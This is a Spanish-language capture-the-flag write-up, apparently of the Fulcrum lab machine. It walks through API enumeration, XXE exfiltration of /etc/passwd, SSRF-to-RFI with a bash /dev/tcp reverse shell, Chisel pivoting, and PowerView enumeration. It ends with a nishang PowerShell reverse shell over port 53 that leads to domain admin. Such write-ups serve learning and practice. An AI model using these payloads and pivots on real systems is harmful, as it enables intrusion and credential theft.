---------
- Tags: #api #API-Enumeration #XXE #XXE-Blind #XXE-SSRF #XXE-RFI #pscredencial #pivoting #chisel #scriptblocks #bypassing-firewall #smb #net-use 
- --------
## Técnicas utilizadas
- API Enumeration - Endpoint Brute Force  
- Advanced XXE Exploitation (XML External Entity Injection)  
- XXE - Custom Entities  
- XXE - External Entities  
- XXE - XML Parameter Entities  
- XXE - Blind SSRF (Exfiltrate data out-of-band) + Base64 Wrapper [Reading Internal Files]  
- XXE + RFI (Remote File Inclusion) / SSRF to RCE  
- Host Discovery - Bash Scripting  
- Port Discovery - Bash Scripting  
- Decrypting PSCredential Password with PowerShell  
- PIVOTING 1 - Tunneling with Chisel + Evil-WinRM  
- Gaining access to a Windows system  
- PowerView.ps1 - Active Directory Users Enumeration (Playing with Get-DomainUser)  
- Information Leakage - Domain User Password  
- PIVOTING 2 - Using Invoke-Command to execute commands on another Windows server  
- Firewall Bypassing (Playing with Test-NetConnection in PowerShell) - DNS Reverse Shell  
- Authenticating to the DC shares - SYSVOL Enumeration  
- Information Leakage - Domain Admin Password  
- PIVOTING 3 - Using Invoke-Command to execute commands on the Domain Controller (DC)
## Procedimiento
![[Pasted image 20230810034509.png]]

#### Reconocimiento
Si lanzamos un **nmap** sobre la maquina, podemos encontrar los siguientes puertos abiertos:
```java
# nmap -sCV -p4,22,80,88,9999,56423 -oN Ports 10.10.10.62
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-11 20:31 UTC
Nmap scan report for 10.10.10.62
Host is up (0.11s latency).

PORT      STATE SERVICE VERSION
4/tcp     open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 502 Bad Gateway
88/tcp    open  http    nginx 1.18.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: phpMyAdmin
9999/tcp  open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 502 Bad Gateway
56423/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: Fulcrum-API Beta
|_http-title: Site doesn't have a title (application/json;charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.02 seconds
```

Un escaneo con **whatweb** sobre el aplicativo web, nos muestra el siguiente resultado:
```ruby
for port in 4 80 88 9999 56423; do echo -e "\n[+] Analizando la web del puerto -> $port\n"; whatweb 10.10.10.62:$port; done

[+] Analizando la web del puerto -> 4

http://10.10.10.62:4 [200 OK] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.10.62], nginx[1.18.0]

[+] Analizando la web del puerto -> 80

http://10.10.10.62:80 [200 OK] ASP_NET[Verbose error messages], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.10.62], Title[Input string was not in a correct format.], nginx[1.18.0]

[+] Analizando la web del puerto -> 88

http://10.10.10.62:88 [200 OK] Content-Security-Policy[default-src 'self' ;options inline-script eval-script;referrer no-referrer;img-src 'self' data:  *.tile.openstreetmap.org;,default-src 'self' ;script-src 'self'  'unsafe-inline' 'unsafe-eval';referrer no-referrer;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;], Cookies[phpMyAdmin,pmaCookieVer,pma_collation_connection,pma_lang], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[phpMyAdmin,pmaCookieVer,pma_collation_connection,pma_lang], IP[10.10.10.62], JQuery, PasswordField[pma_password], Script[text/javascript], Title[phpMyAdmin], UncommonHeaders[x-ob_mode,referrer-policy,content-security-policy,x-content-security-policy,x-webkit-csp,x-content-type-options,x-permitted-cross-domain-policies,x-robots-tag], X-Frame-Options[DENY], X-UA-Compatible[IE=Edge], X-XSS-Protection[1; mode=block], nginx[1.18.0], phpMyAdmin[4.7.4]

[+] Analizando la web del puerto -> 9999

http://10.10.10.62:9999 [200 OK] ASP_NET[Verbose error messages], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.10.62], Title[Input string was not in a correct format.], nginx[1.18.0]

[+] Analizando la web del puerto -> 56423

http://10.10.10.62:56423 [200 OK] Country[RESERVED][ZZ], HTTPServer[Fulcrum-API Beta], IP[10.10.10.62]
```

Buscando cosas en la primera pagina **HTTP** que reside en el puerto **4** encontramos algunos archivos:
![[Pasted image 20230811204726.png]]

Hay un uploader que al parecer no funciona, ya que siempre redirecciona a **upload.php** no importa que tipo de archivo intentes subir:
![[Pasted image 20230811204859.png]]

Dejando de un lado el sitio web del puerto **4**, nos pasamos ahora al sitio web que reside en el puerto **80** y al solo visitarlo, vemos que nos lanza un error por la cara:
![[Pasted image 20230811205031.png]]

En el puerto **88** se aloja un **PhpMyAdmin** que al no disponer de credenciales, no podemos hacer nada realmente:
![[Pasted image 20230811205432.png]]

El puerto **9999** al parecer aloja lo mismo que hay en el puerto **80** dado que al visitarlo lanza literalmente el mismo error:
![[Pasted image 20230811205507.png]]

---------
#### API Enumeration - Endpoint Brute Force  
Por ultimo, visitamos el sitio web que se encuentra en el puerto **56423** el cual, al visitarlo, nos recibe con una respuesta en **Json** la cual, nos indica que probablemente sea trate de una **API**:
![[Pasted image 20230811205721.png]]

Intentando algunas cosas para enumerar un poco la API, como el tramitar información en **.json** no llegamos a dar con nada interesante:
```
Image Request API in Json content
```

#### Advanced XXE Exploitation (XML External Entity Injection)  
Sin embargo, si intentamos mandar algo más parecido a un documento en **XML** vemos que obtenemos una respuesta diferente a la hora de declarar el valor de **ping**:
```xml
<Hearthbeat>
	<ping>ping</ping>
</Hearthbeat>
```

y como respuesta, obtenemos **ping** en lugar del valor por defecto que era **pong**:
![[Pasted image 20230811211430.png]]

---------
#### XXE - Custom Entities 
Intentando algunas cosas encontradas en [Port Swigger](https://portswigger.net/web-security/xxe) como por ejemplo, leer un archivo de la maquina victima a traves de una entidad que apunta a un **wrapper** que tiene como valor el **/etc/passwd** vemos que no funciona:
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<Hearthbeat>
	<ping>&xxe;</ping>
</Hearthbeat>
```

----------------
#### XXE - External Entities
Sin embargo, es probable que la explotación de esto este ocurriendo a ciegas. **Port Swigger** nos brinda otro **Payload** para verificar si este se esta aconteciendo o no:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.10.14.30"> ]>
<test>&xxe;</test>
```

Por otro lado, nos montamos un servidor con **Python** en busca de obtener una respuesta a la hora de mandar el **Payload**. Al mandarlo, podemos ver que recibimos efectivamente una petición del servidor web:
![[Pasted image 20230811211742.png]]

----------
#### XXE - XML Parameter Entities 

Bien, nos podemos aprovechar de esto para enviarnos la data a nuestro servidor a través del **XXE**. Esto, haciendo uso de parametros como lo veremos a continuación:
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://10.10.10.130/pwned.xml" %xxe; %param1; ]>
<test>&filename;</test>
```

--------------
####  XXE - Blind SSRF (Exfiltrate data out-of-band) + Base64 Wrapper [Reading Internal Files]  
Y de nuestro lado, tendriamos que crear un archivo de nombre **pwned.xml** con la siguiente estructura en **xml**:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY filename SYSTEM 'http://10.10.10.130/%file;'>">
```

Ahora, al tramitar la petición, lo que sucedera internamente es que el servidor va a buscar por nuestro archivo **.xml**  el cual dentro contendra una entidad de nombre **file** la cual buscara por el archivo **/etc/passwd** y lo convertira a base64, posteriormente la entidad **param1** contendra dentro de ella otra entidad de nombre **filename** (esta entidad corresponde a la que definimos en el archivo **.xml** a tramitar.) la cual se encargara de mandarnos a nuestro servidor el archivo definido en la entidad **file**.
Como resultado, tendriamos que ver una petición a nuestro servidor el cual contendra el **/etc/passwd** en el formato **base64**:
![[Pasted image 20230811214810.png]]

-----------
#### XXE + RFI (Remote File Inclusion) / SSRF to RCE 
Vamos aprovecharnos del **XXE** para ejecutar comandos a través de un **RFI** el cual se aprovechara de la pagina que se aloja en el puerto **:4**, esta tiene el un parametro por **GET** de nombre **page** la cual a punta a archivos locales de la pagina, sin embargo, al intentar un **RFI** desde nuestro lado, no nos tramita la petición, esto puede deberse, entre tantas, a una sanitización del codigo **PHP** que no permite ejecutar la consulta a **terceros.**

Bien, pues a través del **XXE** cuando intentamos tramitar la petición desde el propio servidor, vemos que si nos llega la petición que de antes no nos llegaba, esto gracias al **SSRF**:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:4/index.php?page=http://10.10.14.130/test"> ]>
<test>&xxe;</test>
```

Y vemos la petición en nuestro servidor:
![[Pasted image 20230812014922.png]]

Pues ahora la intrusión es bastante facil, simplemente creamos un archivo **.php** que contenga lo siguiente:
```
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1'"); ?>
```

Apuntamos a nuestro archivo a través del **SSRF**, nos ponemos en escucha y nos deberia caer la **reverse shell**:
![[Pasted image 20230812015026.png]]

-------------
#### Host Discovery - Bash Scripting
Una vez dentro de la maquina, podemos crearnos un **script** en un **oneline** para ir descubriendo hosts que pertenezcan al mismo segmento de red de la interfaz **192.168.122.1**:
```
# for host in $(seq 1 254); do timeout 1 bash -c 'ping -c 1 192.168.122.$host' &>/dev/null && echo "[+] La IP esta activa -> 192.168.122.$host"&; done; wait
```

Y encontramos los siguientes hosts:
![[Pasted image 20230812020614.png]]

Si lanzamos un ping al **host** descubierto, podemos ver que se trata de una maquina windows gracias al **TTL** (suele ser 128):
![[Pasted image 20230812020633.png]]

------------
#### Port Discovery - Bash Scripting  
Ahora con el **Host** descubierto, vamos a enumerar los puertos existentes en este. Haremos lo mismo, un **oneliners** que nos descubra los hosts:
```
#for port in $(seq 1 65535); do timeout 1 bash -c "echo ' ' > /dev/tcp/192.168.122.228/$port" &>/dev/null && "[+] Puerto: $port -> OPEN"&; done;wait
```

Nos descrube el puerto **80** que es **HTTP** y el **5985** que pertence a el servicio de windows **Win-RM**:
![[Pasted image 20230812021425.png]]

------------
#### Decrypting PSCredential Password with PowerShell
Ahora que sabemos que esta abierto el servicio **Win-RM** solo nos queda encontrar credenciales validas que nos permita conectarnos a este. Si volvemos a la parte web, dentro del sitio web de **uploads** encontramos un archivo **.ps1** que contiene una credencial en formato **SecureString** propio de **PowerShell**:
```powershell
# TODO: Forward the PowerShell remoting port to the external interface
# Password is now encrypted \o/

$1 = 'WebUser'
$2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
$3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA=' 
$4 = $3 | ConvertTo-SecureString -key $2
$5 = New-Object System.Management.Automation.PSCredential ($1, $4)

Invoke-Command -Computer upload.fulcrum.local -Credential $5 -File Data.ps1
```

Usaremos una herramienta que viene por defecto en parrot que simula una **PowerShell** de nombre **pwsh** y pegaremos todo el script integro:
![[Pasted image 20230812021558.png]]

A continuacion, ingresaremos algunos comandos extras para decodear la contraseña:
```powershell
PS> $Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($4)
PS> $4
System.Security.SecureString
PS> $result = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)
[System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)
PS> $result 
M4ng£m£ntPa55
```

Con estas credenciales podemos validar si tenemos acceso a **Win-RM** pero antes, tenemos que hacer **Remote Port Forwarding** con **Chisel** para corroborarlo.

------------
#### PIVOTING 1 - Tunneling with Chisel + Evil-WinRM  
Descargaremos chisel y lo subiremos a la maquina maquina. Lo ejecutaremos en modo cliente de la siguiente manera:
```
# chmod +x chisel; ./chisel client 10.10.10.130 R:5985:192.168.122.228:5985 & disown
```

Y en nuestra maquina lo vamos a ejecutar en modo servidor de esta manera:
```
# chmod +x chisel; ./chisel server --reverse -p 1234 & disown
```

----------
#### Gaining access to a Windows system  
Ahora solo queda conectarnos con **Evil-WinRm**:
```
# evil-winr -i 10.10.10.10 -u 'user' -p 'password'
```

y ya estariamos dentro de la maquina como el usuario **webuser**.

----------------
#### PowerView.ps1 - Active Directory Users Enumeration (Playing with Get-DomainUser)
Enumerando la maquina **windows**, encontramos un archivo de configuración en **inetpub\\wwwroot** que contiene el posible nombre de dominio y credenciales:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration xmlns="http://schemas.microsoft.com/.NetConfiguration/v2.0">
    <appSettings />
    <connectionStrings>
        <add connectionString="LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local" name="ADServices" />
    </connectionStrings>
    <system.web>
        <membership defaultProvider="ADProvider">
            <providers>
                <add name="ADProvider" type="System.Web.Security.ActiveDirectoryMembershipProvider, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" connectionStringName="ADConnString" connectionUsername="FULCRUM\LDAP" connectionPassword="PasswordForSearching123!" attributeMapUsername="SAMAccountName" />
            </providers>
        </membership>
    </system.web>
<system.webServer>
   <httpProtocol>
      <customHeaders>
           <clear />
      </customHeaders>
   </httpProtocol>
        <defaultDocument>
            <files>
                <clear />
                <add value="Default.asp" />
                <add value="Default.htm" />
                <add value="index.htm" />
                <add value="index.html" />
                <add value="iisstart.htm" />
            </files>
        </defaultDocument>
</system.webServer>
</configuration>
```

Con estas credeciales podemos enumerar usuarios pertenecientes al **domain controller**, todo esto a través de [**PowerView.ps1** ](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1). Lo vamos a descargar y posteriormente subirlo a la maquina windows para despues ejecutar estos comandos:
```powershell
PS> Import-Module .\PowerView.ps1
PS> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS> $Cred = New-Object System.Management.Automation.PSCredential('FULCRUM\LDAP', $SecPassword)
PS> Get-DomainUser -Credential $Cred
```

Obtenemos una lista potencial de usuarios. Ahora podriamos filtrar por nombre de usuarios y las veces que han iniciado sesión para ir descartando posibles **rabit holes**:
```powershell
PS> Get-DomainUser -Credential $Cred | select samaccountname, logoncount
```

Si listamos de manera individual las propiedades de estos usuarios, llegamos a dar con uno que es **Domain Admin**:
```powershell
PS> Get-DomainUser -Credential $Cred 923a

company               : fulcrum
logoncount            : 0
badpasswordtime       : 12/31/1600 4:00:00 PM
st                    : UN
l                     : unknown
distinguishedname     : CN=923a,CN=Users,DC=fulcrum,DC=local
objectclass           : {top, person, organizationalPerson, user}
name                  : 923a
objectsid             : S-1-5-21-1158016984-652700382-3033952538-1104
samaccountname        : 923a
admincount            : 1
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 5/8/2022 7:10:32 AM
instancetype          : 4
usncreated            : 12610
objectguid            : 8ea0a902-110d-46ec-98b4-825d392c687c
sn                    : 923a
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=fulcrum,DC=local
dscorepropagationdata : {5/8/2022 7:10:32 AM, 1/1/1601 12:00:00 AM}
givenname             : 923a
c                     : UK
memberof              : CN=Domain Admins,CN=Users,DC=fulcrum,DC=local
lastlogon             : 12/31/1600 4:00:00 PM
streetaddress         : unknown
badpwdcount           : 0
cn                    : 923a
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 5/8/2022 7:02:38 AM
primarygroupid        : 513
pwdlastset            : 5/8/2022 12:02:38 AM
usnchanged            : 12813
postalcode            : 12345
```

----------
#### Information Leakage - Domain User Password 
Bien, pues listando todos los usuarios, llegamos a dar con una password:
```powershell
PS> Get-DomainUser -Credential $Cred BTables | select givenname, info

givenname info
--------- ----
BTables   Password set to ++FileServerLogon12345++
```

------------
#### PIVOTING 2 - Using Invoke-Command to execute commands on another Windows server  
La contraseña encontrada anteriormente nos da una pequeña pista para donde tirar a apartir de aqui. En ella, vemos que esta la palabra `FileServer` nos hace pensar que hay otro dominio que pudiera tener como nombe `file.fulcrum.local`, si le lanzamos un ping a esa dirección vemos que si resuelve:
![[Pasted image 20230812024004.png]]

Con posibles credenciales validas para el usuario en este dominio, podemos intentar tirar de **Invoke-Command** para ejecutar comandos en el dominio como el usuario **BTables**. Lo primero que haremos sera pasar la contraseña a **SecureString**:
```powershell
PS> $password = ConverTo-SecureString '++FileServerLogon12345++' -AsPlainText -Force
PS> $cred = New-Object System.Management.Automation.PSCredential('FULCRUM\BTables', $password)
```

Con la credecial creada, ya podriamos intentar ejecutar comandos:
```powershell
PS> Invoke-Command -ComputerName file.fulcrum.local -Credential $cred -ScriptBlock { whoami }
```

------------
#### Firewall Bypassing (Playing with Test-NetConnection in PowerShell) - DNS Reverse Shell
Ahora, lo que podriamos intentar es entablarnos una reverse shell a nuestra maquina. Primero tendriamos si no hay reglas de **firewall** implementadas, podriamos verificar si tenemos conectividad con nuestra maquina con el siguiente comando:
```powershell
PS> Invoke-Command -ComputerName file.fulcrum.local -Credential $cred -ScriptBlock { Test-NetConnection -ComputerName 10.10.10.130 -Port 443 }
```

En el output podemos ver el campo **PingSucceeded** esta en **False**, esto quiere decir que no tenemos como tal conectividad a nuestra maquina. Algo curioso es que muchas veces por el puerto **53**(corresponde a DNS) se puede burlar este tipo de restricciones a nivel de firewall. Si ahora nos mandamos la conexión nuestro puerto **53** y nos ponemos en escucha podemos ver si recibimos la conexión:
```powershell
PS> Invoke-Command -ComputerName file.fulcrum.local -Credential $cred -ScriptBlock { Test-NetConnection -ComputerName 10.10.10.130 -Port 53}
```

Con la conexión asegurada, podemos tirar del repositorio de **nishang** para entablarnos una **reverse shell** con [Invoke-PowerShellTcpOneLine.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1), solo tendriamos que modificar la IP y el Puerto:
```powershell
PS> Invoke-Command -ComputerName file.fulcrum.local -Credential $cred -ScriptBlock { $client = New-Object System.Net.Sockets.TCPClient('194.113.75.249',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }
```

----------
#### Authenticating to the DC shares - SYSVOL Enumeration  
Una vez como **BTable** podemos tirar de `PS> Get-SMBShare` para ver los recursos compartidos a nivel de red en el dominio:
```
Get-SMBShare

Name   ScopeName Path Description  
----   --------- ---- -----------  
ADMIN$ *              Remote Admin 
C$     *              Default share
IPC$   *              Remote IPC   
```

Nos podemos autenticar para intentar listar alguno de estos recursos compartidos de la siguiente manera:
```powershell
PS> net use \\dc.fulcrum.local\IPC$ /user:FULCRUM\BTables <password>
```

y ahora podemos ver los recursos con el siguiente comando:
```powershell
PS> net view \\dc.fulcrum.local\
```

Para listar más comodamente los recursos, podemos crear una nueva unidad logica:
```powershell
PS> net use x: \\dc.fulcrum.local\SYSVOL /user:FULCRUM\BTables <password>
```

De ahora en adelante, todo el contenido de **SYSVOL** proviniento de **IPC$** estara en la raiz del sistema en la unidad **X:**
```powershell
PS> X:
PS> dir
```

---------
#### Information Leakage - Domain Admin Password  
Si leeamos algunos de los archivos de la carpeta **Scripts** encontramos credenciales de algunos usuarios, pero son bastantes. Podemos hacer uso de algunos filtros para dar con usuarios especificos y corroborar si existen y estan aqui sus contraseñas:
```powershell
PS> Select-String -Path "X:\fulcrum.local\script\*.ps1" -Pattern 923a
PS> type file.ps1
```

Encontramos la contraseña de un usuario, el cual, si hacemos un `net user 932a` podemos visualizar que es parte del grupo **Domain Admins**:
```powershell 
PS> net user 932a
```

---------------
#### PIVOTING 3 - Using Invoke-Command to execute commands on the Domain Controller (DC)
Pues bien, podemos hacer lo mismo que hicimos antes con el usuario **BTable**, crear una **password** usando **SecureString**, posteriormente una credencial con la cual ejecutaremos comandos en el **Domain Controller**:
```powershell
PS> $password = ConvertTo-SecureString '<password>' -AsPlainText -Force
PS> $cred = New-Object System.Management.Automation.PSCredential('FULCRUM\923a', $password)
```

Si lanzamos ahora un `whoami` como este usuario en el **DomainController** vemos que estamos como el usuario **923a** el cual, esta en el grupo **Domain admins** asi que podemos entrar a los recursos privados de **Administrator**:
```powershell
PS> Invoke-Command -ComputerName dc.fulcrum.local -Credential $cred -ScriptBlock { whoami }
```

Con esto, podemos ejecutar el mismo **Invoke-PowerShellTcpOneLine.ps1** que ejecutamos antes para ganar una shell.
